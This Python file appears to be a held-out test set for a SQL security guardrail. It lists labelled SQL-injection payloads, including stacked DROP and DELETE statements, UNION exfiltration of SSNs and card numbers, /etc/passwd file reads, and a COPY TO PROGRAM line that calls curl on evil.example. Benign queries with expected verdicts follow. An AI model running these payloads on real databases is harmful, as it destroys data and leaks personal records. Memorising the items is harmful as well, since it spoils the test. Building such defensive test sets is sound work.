"""
Held-out SQL security set.

PROVENANCE (stated plainly, because it matters for how far the result can be trusted):
  * Written on 2026-10-10 after the guardrail rules existed, in the style of public SQL-injection cheat
    sheets (stacked queries, UNION exfiltration, tautologies, time-based blind, file/OS primitives,
    comment/case/whitespace evasion). It is NOT drawn from a third-party corpus.
  * It was never used to tune a rule: the first run is recorded unmodified in
    results/security.json -> "first_run_unmodified". Anything fixed afterwards is reported as a
    before/after, never silently folded in.

Each attack: (id, category, harm_class, sql, expected)
   expected = "block"       the policy must reject it
              "quarantine"  it must be held for human review
              "neutralize"  it may run, but only in a bounded/harmless form (e.g. LIMIT enforced)
An attack is *contained* when the system blocks or quarantines it (or neutralizes it where allowed).

Each benign query: (id, category, sql, expected)  with expected = "allow" or, for legitimate
queries on sensitive tables, "quarantine" (correct behaviour: a human should review them; these are
reported separately and are NOT counted as false blocks).
"""

ATTACK_SQL = [
    # ---- stacked statements -------------------------------------------------------------
    ("HS-001", "stacked", "destructive", "SELECT name FROM customers; DROP TABLE customers;", "block"),
    ("HS-002", "stacked", "destructive", "SELECT 1;DROP TABLE orders--", "block"),
    ("HS-003", "stacked", "destructive", "select name from customers; delete from orders", "block"),
    ("HS-004", "stacked", "destructive", "SELECT 1; UPDATE salaries SET salary = 0", "block"),
    ("HS-005", "stacked", "destructive", "SELECT 1; INSERT INTO customers (name, email) VALUES ('x', 'y')", "block"),
    ("HS-006", "stacked", "destructive", "SELECT 1; TRUNCATE TABLE orders", "block"),
    ("HS-007", "stacked", "destructive", "SELECT 1; /* hidden */ ALTER TABLE customers ADD COLUMN pwned TEXT", "block"),
    ("HS-008", "stacked", "destructive", "SELECT 1; CREATE TABLE backdoor (a INT)", "block"),
    ("HS-009", "stacked", "privilege", "SELECT 1; ATTACH DATABASE '/tmp/evil.db' AS evil", "block"),
    ("HS-010", "stacked", "privilege", "SELECT 1; PRAGMA writable_schema = 1", "block"),
    # ---- direct DML / DDL / DCL ---------------------------------------------------------
    ("HS-011", "direct_write", "destructive", "DROP TABLE customers", "block"),
    ("HS-012", "direct_write", "destructive", "DELETE FROM orders WHERE 1=1", "block"),
    ("HS-013", "direct_write", "destructive", "UPDATE employees SET ssn = '000-00-0000'", "block"),
    ("HS-014", "direct_write", "destructive", "INSERT INTO salaries (employee_name, salary, department) VALUES ('x', 1, 'y')", "block"),
    ("HS-015", "direct_write", "destructive", "CREATE TABLE stolen AS SELECT name, email FROM customers", "block"),
    ("HS-016", "direct_write", "destructive", "ALTER TABLE orders RENAME TO orders_old", "block"),
    ("HS-017", "direct_write", "destructive", "REPLACE INTO customers (customer_id, name) VALUES (1, 'x')", "block"),
    ("HS-018", "direct_write", "privilege", "GRANT ALL PRIVILEGES ON customers TO PUBLIC", "block"),
    # ---- tautologies / boolean-blind ----------------------------------------------------
    ("HS-019", "tautology", "injection", "SELECT name FROM customers WHERE region = 'North' OR 1=1", "quarantine"),
    ("HS-020", "tautology", "injection", "SELECT name FROM customers WHERE region = '' OR ''=''", "quarantine"),
    ("HS-021", "tautology", "injection", "SELECT name FROM customers WHERE customer_id = 1 OR 'x'='x'", "quarantine"),
    ("HS-022", "tautology", "injection", "SELECT name FROM customers WHERE region = 'North' OR TRUE", "quarantine"),
    ("HS-023", "tautology", "exfiltration", "SELECT name FROM customers WHERE customer_id = 1 AND (SELECT substr(salary, 1, 1) FROM salaries LIMIT 1) = '1'", "quarantine"),
    ("HS-024", "tautology", "exfiltration", "SELECT name FROM customers WHERE customer_id = 1 AND EXISTS (SELECT 1 FROM employees WHERE ssn LIKE '9%')", "quarantine"),
    ("HS-025", "tautology", "injection", "SELECT name FROM customers WHERE region = 'North' OR (1=1)", "quarantine"),
    ("HS-026", "tautology", "injection", "SELECT name FROM customers WHERE region = 'x' OR 2 > 1", "quarantine"),
    # ---- UNION / sub-select exfiltration ------------------------------------------------
    ("HS-027", "union_exfil", "exfiltration", "SELECT name FROM customers UNION SELECT employee_name FROM salaries", "quarantine"),
    ("HS-028", "union_exfil", "exfiltration", "SELECT name, email FROM customers UNION SELECT employee_name, salary FROM salaries", "quarantine"),
    ("HS-029", "union_exfil", "exfiltration", "SELECT name FROM customers UNION SELECT ssn FROM employees", "quarantine"),
    ("HS-030", "union_exfil", "exfiltration", "SELECT name FROM customers UNION SELECT card_number FROM payment_cards", "quarantine"),
    ("HS-031", "union_exfil", "exfiltration", "SELECT name FROM customers UNION SELECT sql FROM sqlite_master", "quarantine"),
    ("HS-032", "union_exfil", "exfiltration", "SELECT name FROM customers UNION SELECT tbl_name FROM sqlite_master WHERE type = 'table'", "quarantine"),
    ("HS-033", "union_exfil", "exfiltration", "SELECT table_name FROM information_schema.tables", "quarantine"),
    ("HS-034", "union_exfil", "exfiltration", "SELECT usename FROM pg_catalog.pg_user", "quarantine"),
    ("HS-035", "union_exfil", "exfiltration", "SELECT user FROM mysql.user", "quarantine"),
    ("HS-036", "union_exfil", "exfiltration", "SELECT name FROM customers UNION ALL SELECT NULL FROM employees", "quarantine"),
    ("HS-037", "union_exfil", "exfiltration", "WITH s AS (SELECT ssn AS v FROM employees) SELECT v FROM s", "quarantine"),
    ("HS-038", "union_exfil", "exfiltration", "SELECT v FROM (SELECT ssn AS v FROM employees) t", "quarantine"),
    # ---- direct access to sensitive tables, disguised ----------------------------------
    ("HS-039", "sensitive_access", "exfiltration", "SELECT employee_name, salary FROM salaries", "quarantine"),
    ("HS-040", "sensitive_access", "exfiltration", "SELECT s.salary FROM salaries AS s", "quarantine"),
    ("HS-041", "sensitive_access", "exfiltration", "SELECT \"salary\" FROM \"salaries\"", "quarantine"),
    ("HS-042", "sensitive_access", "exfiltration", "SELECT SALARY FROM SALARIES", "quarantine"),
    ("HS-043", "sensitive_access", "exfiltration", "SELECT salary FROM main.salaries", "quarantine"),
    ("HS-044", "sensitive_access", "exfiltration", "SELECT salary FROM /* x */ salaries", "quarantine"),
    ("HS-045", "sensitive_access", "exfiltration", "SELECT c.name, e.ssn FROM customers c JOIN employees e ON c.customer_id = e.employee_id", "quarantine"),
    ("HS-046", "sensitive_access", "exfiltration", "SELECT name FROM customers WHERE customer_id IN (SELECT employee_id FROM salaries)", "quarantine"),
    ("HS-047", "sensitive_access", "exfiltration", "SELECT card_number FROM payment_cards", "quarantine"),
    ("HS-048", "sensitive_access", "exfiltration", "SELECT personal_email, phone, ssn FROM employees", "quarantine"),
    # ---- time-based / resource exhaustion ----------------------------------------------
    ("HS-049", "dos", "dos", "SELECT sleep(10)", "block"),
    ("HS-050", "dos", "dos", "SELECT customer_id FROM customers WHERE customer_id = 1 AND pg_sleep(5) IS NOT NULL", "block"),
    ("HS-051", "dos", "dos", "SELECT BENCHMARK(100000000, MD5('x'))", "block"),
    ("HS-052", "dos", "dos", "SELECT customer_id FROM customers WHERE length(randomblob(1000000000)) > 0", "block"),
    ("HS-053", "dos", "dos", "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r) SELECT n FROM r LIMIT 1000000", "quarantine"),
    ("HS-054", "dos", "dos", "SELECT a.order_id FROM orders a JOIN orders b ON 1=1 JOIN orders c ON 1=1", "quarantine"),
    ("HS-055", "dos", "dos", "SELECT a.name FROM customers a, customers b, customers c", "block"),
    ("HS-056", "dos", "dos", "SELECT name FROM (SELECT name FROM (SELECT name FROM (SELECT name FROM (SELECT name FROM customers))))", "block"),
    ("HS-057", "dos", "dos", "SELECT name FROM customers LIMIT 999999999", "neutralize"),
    ("HS-058", "dos", "dos", "SELECT name FROM customers ORDER BY random() LIMIT 100000000", "neutralize"),
    # ---- file system / OS primitives ----------------------------------------------------
    ("HS-059", "file_os", "exfiltration", "SELECT load_extension('/tmp/evil.so')", "block"),
    ("HS-060", "file_os", "exfiltration", "SELECT readfile('/etc/passwd')", "block"),
    ("HS-061", "file_os", "exfiltration", "SELECT pg_read_file('/etc/passwd')", "block"),
    ("HS-062", "file_os", "privilege", "COPY customers TO PROGRAM 'curl http://evil.example/x'", "block"),
    ("HS-063", "file_os", "exfiltration", "SELECT name FROM customers INTO OUTFILE '/tmp/dump.txt'", "block"),
    ("HS-064", "file_os", "exfiltration", "SELECT LOAD_FILE('/etc/passwd')", "block"),
    ("HS-065", "file_os", "exfiltration", "SELECT lo_import('/etc/passwd')", "block"),
    ("HS-066", "file_os", "privilege", "ATTACH DATABASE '/tmp/x.db' AS y", "block"),
    # ---- evasion: case, comments, whitespace, wrappers ---------------------------------
    ("HS-067", "evasion", "exfiltration", "SeLeCt/**/ssn/**/FrOm/**/employees", "quarantine"),
    ("HS-068", "evasion", "exfiltration", "SELECT\tssn\nFROM\nemployees", "quarantine"),
    ("HS-069", "evasion", "destructive", "/*!50000DROP*/ TABLE customers", "block"),
    ("HS-070", "evasion", "exfiltration", "SELECT ssn FROM employees -- DROP TABLE x", "quarantine"),
    ("HS-071", "evasion", "exfiltration", "SELECT ssn FROM employees WHERE 1=1", "quarantine"),
    ("HS-072", "evasion", "exfiltration", "( SELECT ssn FROM employees )", "quarantine"),
    ("HS-073", "evasion", "exfiltration", "((SELECT ssn FROM employees))", "quarantine"),
    ("HS-074", "evasion", "exfiltration", "SELECT ssn FROM `employees`", "quarantine"),
    ("HS-075", "evasion", "destructive", "EXEC('DROP TABLE customers')", "block"),
    ("HS-076", "evasion", "destructive", "SELECT name FROM customers WHERE name = 'a'; -- ' ; DROP TABLE customers; --", "block"),
    ("HS-077", "evasion", "exfiltration", "select ssn from EMPLOYEES", "quarantine"),
    ("HS-078", "evasion", "exfiltration", "SELECT ssn FROM [employees]", "quarantine"),
    # ---- privilege / administration -----------------------------------------------------
    ("HS-079", "privilege", "privilege", "SET ROLE admin", "block"),
    ("HS-080", "privilege", "privilege", "CREATE ROLE evil SUPERUSER", "block"),
    ("HS-081", "privilege", "exfiltration", "PRAGMA table_info(salaries)", "block"),
    ("HS-082", "privilege", "exfiltration", "SHOW GRANTS FOR root", "block"),
    ("HS-083", "privilege", "privilege", "DROP USER admin", "block"),
    ("HS-084", "privilege", "privilege", "REVOKE ALL ON customers FROM PUBLIC", "block"),
]

# Benign queries, all valid against the 21-table demo database (tests/test_benchmark_data.py runs every one).
BENIGN_SQL = [
    # ---- plain reads and filters ----------------------------------------------------------
    ("HB-001", "basic", "SELECT customer_id, name, region FROM customers WHERE region = 'North'", "allow"),
    ("HB-002", "basic", "SELECT name, price FROM products WHERE price > 100 ORDER BY price DESC", "allow"),
    ("HB-003", "basic", "SELECT order_id, amount FROM orders WHERE amount BETWEEN 1000 AND 4000", "allow"),
    ("HB-004", "basic", "SELECT DISTINCT region FROM customers", "allow"),
    ("HB-005", "basic", "SELECT name FROM customers WHERE name LIKE 'A%' OR name LIKE 'B%'", "allow"),
    ("HB-006", "basic", "SELECT name FROM products WHERE category IN ('Electronics', 'Furniture')", "allow"),
    ("HB-007", "basic", "SELECT order_id FROM orders WHERE order_date IS NOT NULL ORDER BY order_date LIMIT 3", "allow"),
    ("HB-008", "basic", "SELECT name, price FROM products ORDER BY price LIMIT 2 OFFSET 1", "allow"),
    # ---- aggregates ----------------------------------------------------------------------
    ("HB-009", "aggregate", "SELECT COUNT(*) AS total_customers FROM customers", "allow"),
    ("HB-010", "aggregate", "SELECT region, COUNT(*) AS n FROM customers GROUP BY region", "allow"),
    ("HB-011", "aggregate", "SELECT customer_id, SUM(amount) AS spend FROM orders GROUP BY customer_id HAVING SUM(amount) > 2000", "allow"),
    ("HB-012", "aggregate", "SELECT AVG(amount) AS avg_order, MAX(amount) AS biggest, MIN(amount) AS smallest FROM orders", "allow"),
    ("HB-013", "aggregate", "SELECT category, COUNT(*) AS products, ROUND(AVG(price), 2) AS avg_price FROM products GROUP BY category", "allow"),
    ("HB-014", "aggregate", "SELECT status, COUNT(*) AS n FROM invoices GROUP BY status ORDER BY n DESC", "allow"),
    ("HB-015", "aggregate", "SELECT carrier, COUNT(*) AS shipments FROM shipments GROUP BY carrier", "allow"),
    ("HB-016", "aggregate", "SELECT priority, status, COUNT(*) AS tickets FROM support_tickets GROUP BY priority, status", "allow"),
    # ---- joins -----------------------------------------------------------------------------
    ("HB-017", "join", "SELECT c.name, o.amount FROM customers c JOIN orders o ON c.customer_id = o.customer_id", "allow"),
    ("HB-018", "join", "SELECT c.name, SUM(o.amount) AS spend FROM customers c JOIN orders o ON o.customer_id = c.customer_id GROUP BY c.name", "allow"),
    ("HB-019", "join", "SELECT p.name, SUM(oi.quantity) AS units FROM order_items oi JOIN products p ON p.product_id = oi.product_id GROUP BY p.name", "allow"),
    ("HB-020", "join", "SELECT o.order_id, s.carrier, s.status FROM orders o JOIN shipments s ON s.order_id = o.order_id", "allow"),
    ("HB-021", "join", "SELECT i.invoice_id, pay.amount, pay.method FROM invoices i JOIN payments pay ON pay.invoice_id = i.invoice_id", "allow"),
    ("HB-022", "join", "SELECT c.name, t.subject FROM support_tickets t JOIN customers c ON c.customer_id = t.customer_id WHERE t.priority = 'high'", "allow"),
    ("HB-023", "join", "SELECT c.name, o.order_id, p.name FROM customers c JOIN orders o ON c.customer_id = o.customer_id JOIN order_items oi ON oi.order_id = o.order_id JOIN products p ON p.product_id = oi.product_id", "allow"),
    ("HB-024", "join", "SELECT cam.name, COUNT(*) AS events FROM web_events w JOIN campaigns cam ON cam.campaign_id = w.campaign_id GROUP BY cam.name", "allow"),
    ("HB-025", "join", "SELECT p.name, sup.name AS supplier FROM product_suppliers ps JOIN products p ON p.product_id = ps.product_id JOIN suppliers sup ON sup.supplier_id = ps.supplier_id", "allow"),
    ("HB-026", "join", "SELECT c.name FROM customers c LEFT JOIN orders o ON o.customer_id = c.customer_id WHERE o.order_id IS NULL", "allow"),
    # ---- CTEs, windows, CASE, set operations ------------------------------------------------
    ("HB-027", "cte", "WITH spend AS (SELECT customer_id, SUM(amount) AS total FROM orders GROUP BY customer_id) SELECT customer_id, total FROM spend WHERE total > 2000", "allow"),
    ("HB-028", "cte", "WITH a AS (SELECT region, COUNT(*) AS n FROM customers GROUP BY region), b AS (SELECT MAX(n) AS m FROM a) SELECT a.region FROM a JOIN b ON a.n = b.m", "allow"),
    ("HB-029", "window", "SELECT order_id, amount, ROW_NUMBER() OVER (ORDER BY amount DESC) AS rnk FROM orders", "allow"),
    ("HB-030", "window", "SELECT customer_id, amount, SUM(amount) OVER (PARTITION BY customer_id) AS customer_total FROM orders", "allow"),
    ("HB-031", "window", "SELECT name, price, RANK() OVER (PARTITION BY category ORDER BY price DESC) AS r FROM products", "allow"),
    ("HB-032", "case", "SELECT name, CASE WHEN price >= 500 THEN 'premium' WHEN price >= 100 THEN 'standard' ELSE 'budget' END AS tier FROM products", "allow"),
    ("HB-033", "case", "SELECT SUM(CASE WHEN status = 'open' THEN total_amount ELSE 0 END) AS open_amount FROM invoices", "allow"),
    ("HB-034", "setop", "SELECT name FROM customers UNION SELECT name FROM suppliers", "allow"),
    ("HB-035", "setop", "SELECT region FROM customers INTERSECT SELECT region FROM customers WHERE name LIKE 'A%'", "allow"),
    ("HB-036", "setop", "SELECT customer_id FROM customers EXCEPT SELECT customer_id FROM orders", "allow"),
    # ---- sub-queries --------------------------------------------------------------------------
    ("HB-037", "subquery", "SELECT name FROM customers WHERE customer_id IN (SELECT customer_id FROM orders WHERE amount > 3000)", "allow"),
    ("HB-038", "subquery", "SELECT order_id, amount FROM orders WHERE amount > (SELECT AVG(amount) FROM orders)", "allow"),
    ("HB-039", "subquery", "SELECT name FROM products WHERE EXISTS (SELECT 1 FROM order_items oi WHERE oi.product_id = products.product_id)", "allow"),
    ("HB-040", "subquery", "SELECT region, avg_spend FROM (SELECT c.region AS region, AVG(o.amount) AS avg_spend FROM customers c JOIN orders o ON o.customer_id = c.customer_id GROUP BY c.region) t", "allow"),
    # ---- functions and dates -------------------------------------------------------------------
    ("HB-041", "function", "SELECT UPPER(name) AS shout, LENGTH(name) AS len FROM customers", "allow"),
    ("HB-042", "function", "SELECT order_id, strftime('%Y-%m', order_date) AS month FROM orders", "allow"),
    ("HB-043", "function", "SELECT COALESCE(region, 'unknown') AS region, COUNT(*) AS n FROM customers GROUP BY COALESCE(region, 'unknown')", "allow"),
    ("HB-044", "function", "SELECT shipment_id, julianday(delivered_date) - julianday(shipped_date) AS days FROM shipments", "allow"),
    ("HB-045", "function", "SELECT ROUND(SUM(amount) * 1.0 / COUNT(*), 2) AS mean_amount FROM orders", "allow"),
    ("HB-046", "function", "SELECT name || ' (' || region || ')' AS label FROM customers", "allow"),
    # ---- keyword look-alikes: the cases a regex filter would wrongly block -------------------------
    ("HB-047", "lookalike", "SELECT name AS last_updated FROM customers", "allow"),
    ("HB-048", "lookalike", "SELECT COUNT(*) AS deleted_rows FROM orders", "allow"),
    ("HB-049", "lookalike", "SELECT name AS drop_off_point FROM suppliers", "allow"),
    ("HB-050", "lookalike", "SELECT reason FROM returns WHERE reason LIKE '%damaged%'", "allow"),
    ("HB-051", "lookalike", "SELECT subject FROM support_tickets WHERE subject = 'Account access'", "allow"),
    ("HB-052", "lookalike", "SELECT 'DROP TABLE customers' AS harmless_text", "allow"),
    ("HB-053", "lookalike", "SELECT 'delete from orders' AS note, COUNT(*) AS n FROM orders", "allow"),
    ("HB-054", "lookalike", "SELECT name FROM customers WHERE name <> 'update'", "allow"),
    ("HB-055", "lookalike", "SELECT 1 /* ; DROP TABLE customers */ AS ok", "allow"),
    ("HB-056", "lookalike", "SELECT name FROM customers -- delete everything after this comment", "allow"),
    ("HB-057", "lookalike", "SELECT status AS created_status, COUNT(*) AS n FROM support_tickets GROUP BY status", "allow"),
    ("HB-058", "lookalike", "SELECT name FROM products WHERE category = 'Insert Kits' OR category = 'Accessories'", "allow"),
    ("HB-059", "lookalike", "SELECT name AS sleep_study_title FROM categories", "allow"),
    ("HB-060", "lookalike", "SELECT campaign_id, name FROM campaigns WHERE name LIKE '%Sale%'", "allow"),
    # ---- legitimate queries on sensitive tables: correct behaviour is human review ------------------
    ("HB-061", "legit_sensitive", "SELECT department_id, COUNT(*) AS headcount FROM employees GROUP BY department_id", "quarantine"),
    ("HB-062", "legit_sensitive", "SELECT full_name, job_title FROM employees WHERE department_id = 1", "quarantine"),
    ("HB-063", "legit_sensitive", "SELECT AVG(salary) AS avg_salary FROM salaries", "quarantine"),
    ("HB-064", "legit_sensitive", "SELECT department, MAX(salary) AS top_salary FROM salaries GROUP BY department", "quarantine"),
    ("HB-065", "legit_sensitive", "SELECT COUNT(*) AS cards_on_file FROM payment_cards", "quarantine"),
    ("HB-066", "legit_sensitive", "SELECT d.name, COUNT(e.employee_id) AS n FROM departments d JOIN employees e ON e.department_id = d.department_id GROUP BY d.name", "quarantine"),
]
